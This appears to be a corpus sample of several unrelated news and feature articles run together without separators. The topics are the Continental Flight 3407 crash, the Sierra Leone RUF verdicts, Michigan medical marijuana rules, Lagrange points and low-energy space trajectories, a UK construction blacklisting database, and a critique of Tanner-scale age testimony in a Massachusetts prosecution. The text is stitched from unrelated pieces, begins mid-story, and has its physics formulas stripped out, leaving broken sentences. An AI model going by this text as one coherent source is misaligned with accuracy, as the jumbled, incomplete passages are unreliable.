The Israeli Consulate in New York is also involved in an effort to inquire for more details on the victims of the crash .
A Continental Airlines spokesperson said , " At this point , we have no knowledge of any Israelis onboard the plane . "
However the Foreign Ministry stated that the airline had contacted the two Israelis ' families .
Continental Connection Flight 3407 flying from Newark Liberty International Airport in New Jersey headed for Buffalo Niagara International Airport crashed into a house while coming in to land Thursday night .
The crash sparked a fiery explosion that killed all 49 people on board and one person on the ground .
The Foreign Ministry continued efforts to gather information on the two Israelis suspected to have been on the flight and the Israeli Consulate in New York is in constant contact with the families .
The RUF trio committed atrocities during the 1991 -2001 civil war An international tribunal has found three Sierra Leone rebels guilty of war crimes and crimes against humanity .
RUF leaders Issa Sesay , 38 , and Morris Kallon , 45 , were convicted of 16 of the 18 charges , while Augustine Gbao , 60 , was found guilty on 14 of the counts .
The Freetown trial of the RUF rebel leaders , related to Sierra Leone 's 10 - year civil war , began in mid-2004 .
Many RUF victims in the court sighed with relief at the verdicts .
Sentences will be decided at a later date .
The BBC's Umaru Fofana at the court in Freetown said that as the verdicts were delivered , Sesay looked very serious and Kallon , clad in a smart light green suit , could have been mistaken for one of the lawyers , while Gbao buried his face in his hands and looked very dejected .
The last case to be held at the special court had heard how the rebel leaders were involved in the rape , mutilation and killings of civilians .
Tens of thousands of civilians had limbs , noses or ears chopped off
The three committed atrocities during the 1991 - 2001 civil war as senior commanders of the Revolutionary United Front ( RUF ) .
On Wednesday the judges concluded the rebel chiefs " significantly contributed " to a joint criminal enterprise with former Liberian President Charles Taylor to control the diamond fields of Sierra Leone to finance their warfare .
They were also found guilty of forced marriage - the enslavement that countless young girls suffered when their villages were raided and they were forced to " marry " a rebel .
' Horrors '
The convictions mark the first time the forced marriage charge has been successfully handed down in an international court of law .
The trial heard harrowing tales from 75 prosecution witnesses of rapes and killings at the hands of the RUF .

The three rebels chiefs were initially indicted along with RUF founder Foday Sankoh , a close ally of Mr Taylor .
But Sankoh died in custody before the case ever came to trial .
Tactics favoured by the rebels included amputating hands and arms or carving the initials RUF into the bodies of their victims .
The RUF was notorious for using the so - called Small Boys Units - child soldiers forcibly recruited and issued with AK - 47 assault rifles - who had a reputation for particular cruelty among the civilian population .
By the time the conflict ended , some 120,000 people had been killed while tens of thousands were left mutilated , their arms , legs , noses or ears cut off .
Sierra Leone expert Gregory Gordon , a US law professor who has worked as a prosecutor in Africa , told the BBC's Network Africa programme : " When we think about blood diamonds , when we think about people having their hands chopped off , when we think about child soldiers and sexual slavery and forced marriages - all the horrors of the civil war in Sierra Leone , we think about the Revolutionary United Front . "
The only trial still ongoing before the UN - backed Special Court for Sierra Leone is that of Mr Taylor , whose case has been moved to The Hague for security reasons .
He faces 11 counts of war crimes and crimes against humanity .
The Sierra Leone conflict was depicted in the 2006 film Blood Diamond , starring Djimon Hounsou , Leonardo DiCaprio and Jennifer Connelly .

You can't blame Rochelle Lampkin for being wary .
During the campaign to gain public support for the Michigan Medical Marijuana Act , the Detroit grandmother was willing to step up and reveal that she would take a toke or two to deal with the excruciating pain she sometimes experiences as the result of an eye condition associated with her multiple sclerosis .
The courage she and a few others showed in admitting publicly that they were breaking the law paid off in a big way .
Last November , Proposition 1 easily passed .
As Greg Francisco , executive director of the nonprofit Michigan Medical Marijuana Association ( MMMA ) notes , nearly two - thirds of the state 's voters approved the measure , with a majority of voters in every state House and Senate district giving a thumbs - up to the proposal .
His point is that , even in the most conservative parts of the state , the plan gained voter approval .
" Support was overwhelming , " he says , explaining that this " is an issue that transcends party politics . "
Despite the public support , Lampkin and others currently find themselves in a gray zone .
It 's not herself that she 's worried about so much as the person who provides her with her medicine — one joint at a time .
The law went into effect Dec. 4 , making it legal for people receiving a doctor 's recommendation to use weed to deal with their health problems , and for them or their designated " care givers " to grow a limited number of plants .
But , according to activists familiar with the issue , doctors by and large remain reluctant to prescribe pot , and state officials have yet to formalize regulations regarding the issuance of ID cards for medical marijuana patients .
The Michigan Department of Community Health has until April 4 to develop administrative rules governing an identification card system registration system for patients .
That would mean the first cards would be issued by April 24 .
Even though it is technically legal to grow and use pot for medical purposes because the law has been enacted , patients and caregivers still run the risk of being arrested , experts say .
If that happens , they will be able to mount what 's called an " affirmative defense of medical necessity " in court .
But there 's a caveat :
" This is a high standard that must be supported by the evidence ... " the MMMA advises on its Web site ( michiganmedicalmarijuana.org ) .
" Going to court is expensive and the results far from certain .
An affirmative defense is not a ' get out of jail free card . ' "
" Qualifying patients and primary caregivers will not be fully protected by the Michigan Medical Marijuana
Act until the final administrative rules are published , the registry established and cards are issued , " the organization advises .
" Until that time it behooves both law enforcement and medical marijuana patients and caregivers to use discretion and common sense . "
" Patients and caregivers are protected , but we do n't want people to feel a false sense of security , " advises Francisco , a Coast Guard veteran who helped spearhead passage of the law .
Complicating matters are the proposed regulations drafted by the state 's Department of Community Health , which met with much criticism from activists at a hearing held in Lansing last week .
" They got an earful , " says Matthew Abel , a Detroit - area attorney and medical marijuana activist .
Among those weighing in on the subject is Karen O'Keefe , an attorney for the Marijuana Policy Project in Washington , D.C. , who played a key role in drafting Prop .
1 .
In a letter to the MDCH , she accused the department — whose director opposed passage of the law — of seeking to add " onerous and unreasonable restrictions on patients " and , in some cases , seeking to impose rules that " contradict " the law passed by voters .
Among other things , O'Keefe criticizes the department for attempting to force medical marijuana users to keep their pot plants locked up , even though " far more dangerous medicine like OxyContin " can be stored anywhere .
Likewise , proposed regulations go too far in invading the privacy of patients by subjecting their homes to " inspection or search . "
" The department and law enforcement are not allowed to enter the home of the seriously ill and search the premises based on their having a Vicodin prescription , " O'Keefe argues in her letter .
In all , O'Keefe identified 22 needed changes in the draft regulations .
James McCurtis , spokesman for MDCH , says his department is taking the objections seriously .
" We are taking those criticisms and suggestions into consideration , " he says .
" Our staff is looking over all the comments and trying to figure out what makes sense and what does n't , what additions and subtractions to make . "
In addition to concerns about the state overreaching , patients must also contend with finding a doctor willing to give an OK to pot use .
That can be difficult , especially in the wake of a newly enacted law such as Michigan's .
" I think physicians are being pretty cautious , " says Francisco .
" Even though the law protects them from state sanctions , I think a lot of them are worried about losing their license to prescribe medications , which comes from the federal Food and Drug Administration .
" Because of that , physicians can be timid .
A few will write recommendations , but others are watching to wait and see what happens before diving in . "
Among those not hesitating to take the plunge is a Southfield clinic opened last month by the THC Foundation , a nonprofit based in Portland , Ore. , that has operations based in seven other states where medical marijuana laws have previously been enacted .
Paul Stanford , the foundation 's executive director , says the clinic saw 24 patients in December and planned to see an additional 75 this week .
Stanford says it is common for both patients and doctors to be wary when a law such as Michigan 's is newly enacted .
In Oregon , for example , the number of patients jumped from 500 the year the law was put in place to 25,000 a decade later .
Michigan , he says , will benefit from having other states having already broken ground .
He predicts as many as 2,000 registered patients this year alone .
Francisco , too , is encouraged despite the obstacles .
The vote on Prop. 1 is more than enough reason to be optimistic .
" When it comes to this issue , we are the mainstream , " he says .

Analysis and the winning of a prize
Nicolaus Copernicus , 1473 - 1543 .
Around the turn of the 15th century , Copernicus came up with the revolutionary idea that the planets orbit around the Sun .
Although this new view of the world was received with hostility in some quarters , notable scientists , including Kepler and Galileo about a century later , came to accept it .
But how exactly did the planets move ?
Did they describe circles , as Copernicus thought , or ellipses , as observation seemed to suggest ?
It took 150 years and the brilliant mind of Isaac Newton to come up with a mathematically rigorous answer .
He considered a simplified problem in which just two massive bodies orbit around each other , each exerting a gravitational pull on the other .
Using his new technique of calculus , Newton took his equation describing the force of gravitational attraction and integrated it .
His solution showed that the path of a planet is always an ellipse .
In fact , what Newton considered was the way in which an object falls through a gravitational field , and he found that , along with the ellipse ( or the special case of a circle ) , there are another two possible paths for a falling object .
These are the well - known parabola of a cannonball , and the hyperbola of an object with enough velocity to completely escape the gravitational pull - such as the Voyager 2 probe now leaving the solar system at nearly 45,000 mph .
These three trajectories are known as conic sections , as they are also the curves produced by cutting a cone along different planes .
Newton had shown that the " two body problem " was integrable , and so could be solved exactly .
His magic formula can tell you precisely where the Earth is in its orbit around the Sun for all time , no matter how far in the past or future - as long as you assume that the Earth and the Sun are the only celestial bodies .
After this triumph of cutting - edge mathematics ( back in the seventeenth century ) the next natural step was to ask about the " three body problem " - could another precise " analytical " solution be found for a solar system composed of the Sun , Earth and Jupiter , for example ?
This question is much more difficult , as the changing gravitational tug of all three bodies produces very complex behaviour .
In fact , without quite realising it , mathematicians at the time had stumbled across one of the first examples of chaos .
They soon realised that the three body problem is not integrable , which means that no exact solution can ever be found .
Isaac Newton , 1643 - 1727 .
If certain simplifications are made , however , the problem can once again be solved analytically .
The " restricted three body problem " assumes that one of the three masses is negligible , and so exerts no gravitational influence on the other two .
The problem is now like tracking the path of a mote of dust as it falls through the gravity field of the Earth and Moon .
Two great mathematicians , Euler and Lagrange , shared a prize offered by the Paris Academy of Sciences in 1772 for their solutions to this problem .
Their analytical solution showed that there exist special regions in the space surrounding two bodies like the Earth - Moon system within which a particle , or spaceship , can orbit naturally while maintaining the same position with respect to the other two .
Euler found three such locations , but Lagrange 's analysis was more thorough and he discovered an additional two less obvious points .
Not that Euler should feel cheated however , as he had already lost sight in both eyes and completed the entire solution in his head !
But neither of them could have had any idea how important their work would become 200 years in the distant future , with our spacecraft now routinely voyaging through the inky blackness of the solar system .
Lagrange points
These unique regions in space became known as Lagrange points , and there are a total of five in every two body system .
To understand the mechanics of these five points , let 's take as an example the system arising from the Earth , the Moon and a spaceship .
To keep things simple , let 's assume that the Moon and the spaceship both orbit the Earth in perfect circles , and that the spaceship exerts no gravitational pull on the other two .
Leonhard Euler , 1707 - 1783 .
Joseph - Louis Lagrange , 1736 - 1813 .
Newton 's first law of motion says that an object moving at a certain speed into a certain direction will keep moving in that same direction and at the same speed , unless there is some force which diverts it off its path or changes its velocity .
If an object , like the Moon or our spaceship , is to describe a circular motion , then it must be experiencing a force which continually pulls it towards the centre of the circle .
This is called the " centripetal force " and is given by the formulawhereis the mass of the object , is its velocity and the distance from the centre of the circle .
In our example , this centripetal force is supplied by the Earth 's gravitational pull , which according to Newton 's law of gravitation iswhereis the mass of the Earth , the gravitational constant , andandare , as before , the mass of the object and its distance to the centre of the Earth .
If an object of massorbits the Earth at distancethen the gravitational pull of the Earth must supply exactly the centripetal force needed to keep it in orbit , soRearranging , this givesSo for the object to be orbiting Earth at distance , its velocity must be exactly Any slower and the Earth 's pull will make it spiral in until it reaches its natural orbit , any faster and it will migrate outwards a short way .
This formula also tells us that the further an orbiting object is from the Earth , the longer it will take to complete one full turn around the Earth : decreases as increases .
A spaceship orbiting Earth further out than the Moon will take more time for a complete turn than the Moon , while one further in will take less .
But so far we have ignored the influence of the Moon 's gravity on the spaceship .
Suppose , for example , that the spaceship sits on the straight line segment connecting Earth and Moon .
Then the gravitational pull of the Moon will counteract that of the Earth .
The net force the spaceship feels is reduced ; the centripetal force is weakened .
This means that the spaceship orbits slower than it would if the Moon was n't there .
In fact , there is one point on the line between Earth and Moon where the spaceship orbits Earth at exactly the same speed as the Moon , and this in one of the Lagrange points .
Figure 1 - not drawn to scale .
There are four other points at which the combined gravitational pull of Earth and Moon exactly balances the centripetal force .
As the solar system turns , a spaceship sitting at these points always maintains the same position with respect to Earth and Moon .
The diagram in figure 1 shows the Lagrange points in Earth 's neighbourhood - made up of all five due to the Moon , and two of those from the Sun .
The first three Lunar Lagrange points ( LL1 , LL2 and LL3 ) all lie on the line joining the Earth and the Moon and were the ones found by Euler .
LL4 and LL5 each form the third point of an equilateral triangle and so always keep 60° in front and behind of the Moon as it circles the Earth .
These Lagrange points are not merely mathematical curiosities , though , as they are already being used by spacecraft exploring the solar system .
Of course our model above is very simplified : there are more than just two massive bodies in the solar system , the planets ' orbits are elliptical rather than circular , and there are other forces at work , not just gravity .
Nevertheless , calculations along similar lines as the ones above still approximate reality well enough to be used in real - life space travel .
At any of the five Lagrange points , a spaceship can maintain a fixed position with respect to the two larger bodies with relatively little effort , and so they are perfect for long - duration space missions .
The EL1 point is currently orbited by the Solar and Heliospheric Observatory Satellite ( SOHO ) as it offers an unrestricted view of the Sun , and WMAP is observing the left - over radiation of the Big Bang from its orbit around EL2 .
Different kinds of equilibrium
The exact dynamics around some of the Lagrange points , however , is far more complicated than Euler and Lagrange could have predicted .
Understanding it requires the full power of modern dynamical systems theory .
The two points L4 and L5 are " stable equilibria " .
In other words , if a spacecraft placed at this location becomes nudged , or perturbed , it will naturally return to its original point .
It is like a marble placed in a wash basin .
The slightest displacement away from the bottom moves the marble up the curved side .
It might roll round in circles for a bit , but it will always eventually return to the plug hole .
Similarly , a spacecraft can stably orbit around the empty space at L4 or L5 .
The first three Lagrange points L1 , L2 and L3 , however , are " unstable equilibria " .
They are examples of " saddle points " .
Instead of a wash basin , think of a horse - riding saddle .
It curves upward in one direction but downward along another axis .
This means that if the marble is nudged even minutely away from the equilibrium point , it starts falling down the gradient and will never return .
Similarly , a spaceship at L1 , L2 and L3 will drift off at the slightest disturbance .
SOHO and WMAP both need to fire their thrusters about once a fortnight to keep themselves orbiting their unstable Lagrange point .
Figure 2 - not drawn to scale .

Figure 2 shows a map of the gravity field of the Sun - Earth restricted three body problem .
The contours show that the steepest gradients surround the Earth and Sun , with the five Earth Lagrange Points located in equilibrium regions with relatively gentle gradient .
L1 - L3 are unstable saddle points , and spacecraft positioned here will always drift away from the equilibrium .
L4 and L5 are stable equilibria , and objects can orbit here indefinitely .
The blue arrows show that L4 and L5 are actually atop a potential hill - it is the additional effect of the " Coriolis force " that makes them stable .
So some of the most advanced machines ever built are using special equilibria points that were found two centuries ago , along with some more recent mathematics in the form of stability analysis and dynamical theory .
But the importance of the unstable Lagrange points does not stop here .
As we 've seen , analysis with calculus can find exact solutions to the equations describing only two massive bodies .
How can we ever predict anything about the motions of all nine planets within our solar system ?
Until recently mathematicians simply ignored the interactions between the planets ' gravitational forces , an assumption that works fine to a certain level of accuracy .
But now with the advent of ever faster supercomputers , mathematicians can use a much more brute - force approach and calculate numerical solutions .
Instead of attempting to solve the equations exactly , they model a complex system step - by - step , crunching through an enormous number of separate integration calculations to see how the system behaves over time .
With this technique , something very surprising has been discovered about the dynamics of our own solar system , and it all comes back to the old Lagrange points .
But first , we need to learn a little bit about space travel .
Ultra -low energy trajectories
Moving between different positions within the gravity field of the solar system requires energy .
The space shuttle must obviously expend an enormous amount of fuel to launch itself against the pull of gravity into an orbit 400 km over the Earth 's surface .
The Apollo spacecraft had to fire rockets to lift their astronauts even further up to get to the Moon , and then again to bring them home afterwards .
Even though there is no air friction , moving between two positions in the solar system usually requires a rocket burst to provide a change in velocity , or " delta V " as it is known .
The delta V needed to reach a low Earth orbit ( LEO ) from the ground is 9.7 km /s ( about 22,000 mph ) .
The delta V to lift a spacecraft from LEO to the Lunar Lagrange point LL1 is a further 3.15 km /s ( much less because the strength of gravity decreases with distance ) .
Now , it just so happens that the delta V needed for the one and a half million kilometre journey from LL1 to EL2 is only 0.014 km /s - no faster than a cyclist !
The fact that the energy levels of this Lunar Lagrange and Earth Lagrange point are so similar is purely a coincidence , but it opens up a fabulous opportunity for space exploration .
There is an ultra - low energy pathway between these two crucial points in space - meaning no " uphill struggle " in either direction and spacecraft can travel between the two with virtually no fuel .
More and more satellites are being planned for the Earth Lagrange points .
If any of them were to break down so far from home they would be virtually impossible to retrieve or repair .
Sending astronauts up to fix the Hubble Space Telescope in Earth orbit was difficult enough .
Getting astronaut mechanics out to EL2 would require not only a rocket as big as that which took men to the Moon but a voyage time of three months one - way , all the while exposed to the harsh space radiation outside Earth 's magnetic field .
No faster than a cyclist
However , due to this low - energy pathway , faulty spacecraft could be commanded to coast back to LL1 , practically for free .
NASA has been seriously considering LL1 as an ideal location for a permanent space - station .
Not only would a space habitat be an astounding human achievement , but it could serve as a repair station for faulty satellites returning along the EL2 - LL1 pathway .
An interplanetary superhighway
But how do these low energy pathways arise ?
Can we find more of them and so enable our spacecraft to tour the solar system virtually for free ?
The foundations for the discovery of such a network was laid in the late 19th century by the legendary mathematician Jules - Henri Poincaré .
Poincaré worked on the three body problem .
His crucial observation was that although it is impossible to precisely predict the trajectories of particles near the unstable Lagrange points , you can separate out families of trajectories that behave similarly .
These similar trajectories together form the surface of a tube .
A particle that starts out on such a tube will move along its surface , spiralling away from the Lagrange point .
For each such out - bound tube , called an " unstable manifold " , there is an in - bound tube , called a " stable manifold " , along which particles move towards a region around the Lagrange point .
Near each unstable Lagrange point , there is a multitude of such pairs of tubes , winding around each other in a very complex way , but ultimately going off into wildly different directions .
Theoretically , a spaceship could hitch a free ride to the region close to the Lagrange point on an in - bound tube .
More excitingly , what if an out - bound tube coming from the region around a lunar Lagrange point intersects an in - bound tube to a region around a Lagrange point of , say , the Sun - Jupiter system ?
Then a spacecraft could travel from one to the other practically for free , as long as it switches manifolds at the right moment .
I was n't until the 1980s that the idea of exploiting manifolds for space travel was given serious consideration .
But over the last few years , NASA mathematician Martin Lo and his team have built an elaborate theory around this idea .
With increased computing power , these scientists used numerical experiments and did indeed find some such low energy paths .
Each of these is like a valley carving through the potential energy landscape of the solar system .
Spacecraft could flow along these channels practically effortlessly - barely needing thrusters to struggle against gravity .
Earth 's Lagrange points are linked to those of Mars , or Saturn , by these minimal energy trajectories .
Jupiter has Lagrange points associated with each of its many moons , all joined up into an interlinked web , which itself connects to the Earth system via the Jupiter - Sun Lagrange points .
Spacecraft travelling along routes within this tube would be able to efficiently reach their destination .
Any spacecraft that fly beyond the manifold , however , would enter the " unstable region " and their trajectory would inexorably stray further and further away from the low - energy tube .
This collection of low - energy trajectory families spreads across the entire solar system , regularly interconnecting at Lagrange points into a vast system of tunnels .
And the system is not stationary : the tubes forming the stable and unstable manifolds move with the planets , an ultracomplex heap of writhing interplanetary spaghetti .
Jules Henri Poincaré , 1854 - 1912 .
This network is as ancient as the solar system , but is completely invisible and would have lain undiscovered were it not for the power of modern mathematics and numerical integration on fast computers .
The mathematicians that discovered this system of low - energy trajectories have named it the Interplanetary Superhighway , or IPS .
The fact that the behaviour of trajectories near unstable Lagrange points is unpredictable , or chaotic , is only a minor nuisance for spacecraft stationed here .
A total delta V of only a few m/s per year would be needed to keep nudging the space - station back towards the equilibrium point .
But , according to Martin Lo , this inherent instability provides a remarkable opportunity for human exploration of the solar system
The Lunar Gateway
In chaos theory , systems like the LL1 Lagrange point are known as " highly nonlinear dynamical regions " .
If an object close to LL1 gets nudged , it will drift away , like the marble falling off the down - ward slopes of the saddle .
Even a slight alteration to a trajectory passing close to LL1 will take it off into a different direction and lead to a large change in the eventual path of the spacecraft .
This is more popularly known as the " Butterfly Effect " - in chaotic regions of space a small perturbation results in a huge difference in outcome .
The upshot of all of this is that a spacecraft swinging past LL1 can easily push itself from one low - energy trajectory onto another that leads to a completely different destination .
Thus a probe launched from Earth could , theoretically , be sent to LL1 , fire its thrusters at a precisely calculated time , and efficiently switch from the LL1 - EL2 tunnel into the one leading to Mars .
The neighbourhood around LL1 is like a vast highway interchange , allowing spacecraft to choose between different IPS pathways .
This means that a human habitat at LL1 could not only be used as a service - station for spacecraft needing repairs , but as a departures terminal for missions throughout the solar system .
The space - station would very literally serve as the Gateway into the tunnel network of the Interplanetary Superhighway .
Figure 3 : a perspective view of different paths through Earth 's local IPS .
The Genesis trajectory is only one of a large set of similar paths - it orbits EL1 five times , and returns to Earth via EL2 .
The other trajectories shown leaving EL1 each orbit the Earth in a different way , and some even interchange at the LL1 Gateway and exit the Earth - Moon system entirely - shown winding off past EL2 to the right .

Ancient travellers
Most of these interplanetary journeys are still in the realms of theory , and the scientists admit that most of these meandering routes would take much more time than a trip using more conventional methods .
But if you think that all of this is high - octane science fiction of a distant future , then you 're wrong .
The Interplanetary Superhighway has already been travelled by one of our spacecraft .
" Genesis " was a probe launched in 2001 under the direction of Martin Lo .
Its mission was to collect samples of the solar wind - the stream of charged particles flowing off the Sun .
After launch the spacecraft was injected into a precisely pre-planned course along the local IPS in Earth 's neighbourhood .
Genesis spent two and a half years orbiting around EL1 before looping once around EL2 and then re-entering Earth 's atmosphere in the afternoon skies over Utah , USA .
And all of this without needing any rockets to change course ( aside from very minor thrusts to keep it on the planned path ) - the entire trajectory was ballistic like a ball thrown in the air .
The whole mission , right down to the precise time of arrival back on Earth , had been calculated years in advance using chaos mathematics and computers .
It has even been mathematically proven that , in principle , virtually any tour around Earth 's neighbourhood could be designed , no matter how convoluted , along low - energy trajectories of the IPS .
The spacecraft can be sent around the Sun , then the EL1 , then the Earth , then EL2 , with any desired number of orbits at each stage .
Genesis demonstrates well the power of mathematical analysis using computers and the advantages of chaotic regions .
But it was not the first explorer , not by a long way , to have used the Interplanetary Superhighway .
Some comets have been travelling along the ethereal tunnels for aeons , and the asteroid that wiped out the dinosaurs 65 million years ago is believed to have reached Earth through the IPS .
For some scientists , these near - Earth asteroids present as much of an opportunity as they do a threat .
Many scenarios of dealing with such a potential killer involve trying to destroy it with nuclear weapons or landing rockets to push it away into a wider orbit .
But using the nonlinear dynamics of the IPS such passers - by could be captured and parked in an orbit around one of the Lagrange points .
Such a huge lump of iron would provide humanity with an enormous supply of raw materials for space industrial complexes .
This newly found Interplanetary Superhighway is a perfect example of the overlap between classic analysis and modern numerical techniques .
The genius minds of Euler and Lagrange used the new technique of calculus to solve the restricted three body problem and show the existence of these intriguing equilibrium points in space .
Now , 200 years later , we are employing our own ground - breaking methods using dynamical systems theory and supercomputers , and taking our first steps along the invisible tunnels stretching through the solar system .

For years , 66 - year - old Ian Kerr has run his business quietly in a first - floor office in the Worcestershire town of Droitwich .
There was no nameplate for his premises , which was protected by a green door , and workers in the neighbouring shops either failed to notice him or thought he was a little mysterious .
" Oh yes , Ian , " said one .
" He has been there for years .
We never really knew what he does - probably works for MI5 or something . "
Kerr did not work for the security services , but the world he operated in was certainly a private one , and it can be exposed today because of an investigation by the office of the information commissioner , Richard Thomas .
Thomas , whose watchdog is entrusted with maintaining the public 's privacy , believes Kerr has spent 15 years compiling and maintaining a huge database on 3,200 workers from around the country .
He alleges that Kerr , trading under the anodyne name of The Consulting Association , sold information from this database to construction companies who wanted to vet potential staff .
The end for Kerr 's business came on Monday last week when Thomas sent his officials past the green door to raid the office .
It caught Kerr unawares .
Thomas 's officials took away the entire contents of the database , as well as invoices from companies in the construction industry which were paying Kerr .
The commissioner believes that these show the companies paid Kerr a flat fee of £ 3,000 a year and then a fixed fee for each name they wanted checked .
He said invoices for up to £ 7,500 were discovered in the office .
Details of workers ' trade union activities and past employment conduct were recorded on cards .
One individual was said to be a " poor timekeeper , will cause trouble , strong TU [ trade union ] " .
Another card referred to a member of the Union of Construction , Allied Trades and Technicians as " Ucatt ... very bad news " .
A member of the Transport and General Workers Union was described as " a sleeper and should be watched " .
One entry on a worker simply said : " Do not touch ! "
Sprinkled throughout the database were warnings of the confidentiality of the database ; companies were told " do not divulge any of the above " .
Kerr told the Guardian that he never gave advice or judgments to companies about whether to give a job to an individual as it was up to the firms to make the final decision .
He said prudent managers had a right to check who was being taken on and denied that it amounted to blacklisting .
" There was nothing sinister about it .
It was bona fide , " he said .
It appears that Kerr has spent many years compiling databases on workers .
He did not wish to comment on a report in the Guardian 15 years ago which said he had been working for the Economic League , a controversial vetting agency which accumulated files on thousands of people it considered subversive between 1919 and 1993 .
The league disbanded after it was alleged that many of its files were inaccurate and so workers were unjustly being denied work .
Kerr 's snooping career has been brought to an abrupt end by the information commissioner , who ordered him to stop .
Kerr has agreed to wind up his business .
Yesterday David Smith , the deputy information commissioner , said : " This is a serious breach of the Data Protection Act .
" Not only was personal information held on individuals without their knowledge or consent , but the very existence of the database was repeatedly denied [ by the industry ] .
" The covert system enabled Mr Kerr to unlawfully trade personal information for many years , helping the construction industry to vet prospective employees .
Kerr held information on thousands of construction workers and profited by checking names against his database . "
After closing down Kerr 's business , the information commissioner is to prosecute him for breaking the Data Protection Act .
He has named more than 40 companies which he alleges bought " sensitive " personal data from Kerr and is considering further legal action to " stamp out this type of activity " .
Many building firms did not wish to comment yesterday , but others did offer a reaction .
NG Bailey said : " We are taking these claims very seriously and an immediate and thorough investigation into the matter has been launched . "
Laing O'Rourke said that , in recent years , it had bought up companies which had been paying Kerr .
A spokesman said : " The relationship has now ceased .
Laing O'Rourke has a very clear policy of solely hiring staff on merit and capabilities , irrespective of their background . "
Morgan
Est said it had also " inherited " Kerr 's services .
" This subscription has been terminated , " it said .
Skanska said it had made payments to Kerr in the past , adding these services had not been used for blacklisting " to the best of our knowledge " .
BAM Construct UK said it had been a " member of the Consulting Association " , but " has never purchased or used ' blacklisting ' data .
We do not have a blacklist and we have never had a blacklist . "
Commissioner 's list : Companies allegedly involved
The information commissioner , Richard Thomas , alleges that the following companies have been making payments to a private investigator , Ian Kerr .
Thomas said the use of brackets indicates where companies have undergone a change of name or where subsidiaries have been absorbed by parent companies .
He added that the phrase " ex- member " next to a name means that company may no longer exist or no longer pay for Kerr 's services .

For 4 years the State and its star witness , a medical professional , knew that 34 of 37 alleged child porn images were the copyrighted property of a well established adult web site operating out of Maryland .
For a year and a half the State and its star witness had documented proof the 8 females in the 34 images were adults at the time of production .
Yet the State and its star witness continued to insist , under oath , the 8 females were no older than 13 in the images –including the female they knew was 27 years old .
What follows is an abbreviated chronology of the prosecution , including several court filings ( pdf ) .
COMMONWEALTH vs. HOOSE
In January 2003 , Sturbridge Massachusetts police detective Chris Donais ( Donais ) , and Sgt. Jude Buckley ( Buckley ) , of the Massachusetts State Police Computer Forensic Unit executed a search warrant on the residence of one Kelly Hoose ( Hoose ) , and seized his computer , among other items .
In early February 2003 , Buckley rendered a forensic report of his examination of Hoose ’s computer , which included 110 color photos of digital images Buckley believed were child pornography , retrieved from the hard drive .
In March 2003 , Donais met with Dr. Christine Barron ( Dr. Barron ) , then Director of the U - Massachusetts Memorial Medical Center ’s Child Protection Program .
After examining the 110 color photos , Dr. Barron identified 38 ( one of which was a double ) , as containing females under the age of 18 engaged in the proscribed conduct .
These 37 photos were the basis for a four count Massachusetts state grand jury indictment against Hoose .
The Assistant District Attorney prosecuting the case , Maura McCarthy , did not show or offer the photos to the grand jury .
In November 2004 , Hoose ( attorney James Kaeding ) filed a motion to exclude the expert testimony of Dr. Barron regarding her opinion of the ages of the females , and her application of the Tanner Scale to the females in the photos .
In January 2005 , Hoose requested a certificate to subpoena the records of ALS Scans Inc. , a Maryland based adult business operating an adult web site since 1998 .
Thirty - four of the 37 images charged were clearly marked with an ALS Scans Inc. copyright , the internet address www.alsscans.com ( nsfw ) and the names of the model (s ) ; “ Ashley ” , “ Trisha ” , “ Jo ” , “ Zoe ” , “ Courtney ” , “ Trista ” , “ Ginger ” and “ Lainey ” .
In a March 10 , 2005 response to a Hoose motion , the government falsely claimed the photos were “ provided to and described to the Grand Jury . ”
On the same date , a Daubert hearing was held to determine whether the foundation of Dr. Barron ’s expert opinion , Tanner Staging , was relevant and reliable under a Daubert analysis , and thus admissable to the element of minority .
At the Daubert hearing , Dr. Barron testified that she was conservative in her analysis of the 110 color photos and chose only those images consistent with a Tanner Stage 1 or 2 , meaning :
THE COURT : So all of the images that form the basis of this case , in your opinion , show females with an age no older than 13 ?
THE WITNESS : That ’s correct .
Dr. Barron alleged that 99.9 % of females classified as Tanner Stage 1 or 2 would be under the age of 18 .
She also testified that the process of Tanner Staging did not require the live presence of the individual .
On March 16 , 2005 , the court denied Hoose ’s motion to exclude Dr. Barron ’s expert opinion , finding her testimony “ credible . ”

Court Order Denying Hoose Motion To Exclude Barron ’s Expert Testimony
In April 2005 , pursuant to a subpoena , Sarah Kiwak , Custodian of Records for ALS Scans , provided an Affadavit to the court , with attached exhibits in accord with federal law , identifying the 8 ALS Scans models alleged .
The Affadavit , along with copies of birth certificates , social security numbers , signed model contracts and dates of production , verified that the 34 ALS Scans images contained adults , most of whom were in their 20’s at the time of production .
In a September 2005 response to a Hoose motion , the government repeated its false claim that the alleged victims were unknown , and stated they had no “ affirmative obligation ” to contact ALS Scans regarding their records of the 8 models .
In an October 2005 ruling , the court denied Hoose ’s motions to dismiss , yet acknowledged :
The images all contain a copyright year , the first name or names of the ‘ models , ’ and the words “ ALS Scans Inc. ” and http://www.alsscans.com” …. The Grand Jury was not presented with any information concerning the web site from which the images were obtained … ”
In 2006 , in anticipation of trial , Hoose subpoenaed one of the 8 ALS Scans models , “ Ashley ” , ( Melissa Bertsch ) to testify in his defense , something she was familiar with as this is one of a number of cases in which her images have been alleged to be child porn .
In December 2006 , a bench trial commenced .
Dr. Barron testified for the government , while an alleged victim , Melissa Bertsch ( ” Ashley ” ) testified for Hoose .
According to witnesses , Dr. Barron ’s testimony was consistent with her testimony at the Daubert hearing .
Although the State was in possession of certified documents identifying the 8 models in those 34 photos as adults at the time of production , Dr. Barron continued to insist they were minors no older than 13 years of age , including the one sitting in the courtroom , Melissa Bertsch .
The court found Hoose not guilty on all four counts .

At no point during the 4 year time frame did anyone involved in the prosecution contact , investigate or shut down ALS Scans business properties .
At no point during the 4 year time frame did Dr. Barron report the child abuse she had testified about to the proper authorities , as required under Massachusetts law .
It ’s clear the prosecution had nothing to do with justice , truth or protecting children .
Instead , the agenda was , in part , an extreme attempt to advance a fraud being perpetuated upon the courts ; the use of “ experts in age determinations ” in general , and the use of “ Tanner Staging ” in particular to satisfy the government ’s burden of proof on the element of minority in alleged child porn prosecutions .
In December 1998 , the medical journal Pediatrics published a letter authored by Dr. James Tanner and a colleague , Dr. Arlan Rosenbloom .
In the letter , Dr. Tanner condemned the “ wholly illegitimate use ” of his Tanner Scale to estimate age from a stage in this context as it was not designed for such purpose .
Less than a year later , the DOJ , recognizing that only Dr. Tanner can speak for his research , dismissed what remained of the indictment , ( receipt ) , in U.S. v Katz :
Dr. Tanner ’s recently published criticism calls into question the prior Daubert ruling and the credibility and admissibility of expert testimony to establish that a model in a pornographic video tape is under the age of eighteen , based upon the Tanner Scale of Human Development .
